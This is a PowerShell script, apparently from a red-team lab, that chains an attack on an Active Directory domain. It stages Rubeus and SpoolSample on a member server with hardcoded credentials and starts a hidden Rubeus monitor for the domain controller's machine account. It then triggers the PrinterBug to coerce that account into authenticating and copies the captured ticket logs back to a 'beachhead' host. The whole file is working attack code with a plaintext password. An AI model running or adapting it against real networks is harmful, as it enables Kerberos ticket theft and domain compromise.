[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$TargetDC = "dc02.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$CaptureServer = "mbr01.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$RemoteDir = "C:\Windows\Temp\cadre-tools",
    [Parameter(Mandatory=$false)]
    [int]$MonitorSeconds = 60
)
$ErrorActionPreference = "Stop"

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", $securePass)

# Stage Rubeus + SpoolSample on mbr01 from ws01 beachhead (T1570)
$srcRubeus = Join-Path $ToolSource "Rubeus.exe"
$srcSpool = Join-Path $ToolSource "Sliver\SpoolSample.exe"
if (-not (Test-Path $srcSpool)) { $srcSpool = Join-Path $ToolSource "SpoolSample.exe" }
if (-not (Test-Path $srcSpool)) { $srcSpool = Join-Path $ToolSource "Old_Tools\SpoolSample.exe" }
if (-not (Test-Path $srcRubeus)) { throw "Rubeus.exe not found in $ToolSource" }
if (-not (Test-Path $srcSpool)) { throw "SpoolSample.exe not found in $ToolSource" }

$remoteRubeus = Join-Path $RemoteDir "Rubeus.exe"
$remoteSpool = Join-Path $RemoteDir "SpoolSample.exe"
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($d) New-Item -ItemType Directory -Force -Path $d | Out-Null } -ArgumentList $RemoteDir
    Copy-Item -Path $srcRubeus -Destination $remoteRubeus -ToSession $sess -Force
    Copy-Item -Path $srcSpool -Destination $remoteSpool -ToSession $sess -Force
    Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) icacls $p1 /grant "Everyone:(RX)" | Out-Null; icacls $p2 /grant "Everyone:(RX)" | Out-Null } -ArgumentList $remoteRubeus,$remoteSpool
    Write-Output "STAGED: Rubeus -> $remoteRubeus, SpoolSample -> $remoteSpool"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$timestamp = Get-Date -Format yyyyMMddHHmmss
$monitorOut = Join-Path $RemoteDir "T102-rubeus-monitor-$timestamp.txt"
$spoolOut = Join-Path $RemoteDir "T102-spoolsample-$timestamp.txt"

# Start Rubeus monitor in background on mbr01 via WinRS
# We use schtasks as SYSTEM to run the monitor detached (T1569.002)
$monitorScript = @"
Start-Process -FilePath '$remoteRubeus' -ArgumentList 'monitor /interval:5 /targetuser:$TargetDC`$ /nowrap' -RedirectStandardOutput '$monitorOut' -RedirectStandardError '$monitorOut' -WindowStyle Hidden
Write-Output "MONITOR_PID:`$PID"
"@

Invoke-Command -ComputerName $Server -Credential $cred -Port 5985 -ScriptBlock { param($cmd,$out) & cmd.exe /c $cmd | Out-File $out -Append -Encoding ASCII } -ArgumentList $monitorScript,$monitorOut -ErrorAction Stop
Write-Output "MONITOR_STARTED: output -> $monitorOut"

Start-Sleep -Seconds 5

# Trigger PrinterBug from mbr01 to coerce dc02$ to auth to mbr01
$spoolScript = @"
& '$remoteSpool' '$TargetDC' '$CaptureServer' | Out-File '$spoolOut' -Append -Encoding ASCII
Write-Output "SPOOL_TRIGGERED"
"@
Invoke-Command -ComputerName $Server -Credential $cred -Port 5985 -ScriptBlock { param($cmd,$out) & cmd.exe /c $cmd | Out-File $out -Append -Encoding ASCII } -ArgumentList $spoolScript,$spoolOut -ErrorAction Stop
Write-Output "SPOOL_TRIGGERED: $TargetDC -> $CaptureServer, output -> $spoolOut"

Start-Sleep -Seconds $MonitorSeconds

# Pull monitor output back to ws01
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) icacls $p1 /grant "Everyone:(R)" | Out-Null; icacls $p2 /grant "Everyone:(R)" | Out-Null } -ArgumentList $monitorOut,$spoolOut
    $localDir = "C:\Tools\cadre-attack"
    if (-not (Test-Path $localDir)) { New-Item -ItemType Directory -Path $localDir -Force | Out-Null }
    Copy-Item -Path $monitorOut -Destination "$localDir\T102-rubeus-monitor-$timestamp.txt" -FromSession $sess -Force
    Copy-Item -Path $spoolOut -Destination "$localDir\T102-spoolsample-$timestamp.txt" -FromSession $sess -Force
    Write-Output "PULLED: monitor/spool logs to $localDir"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}
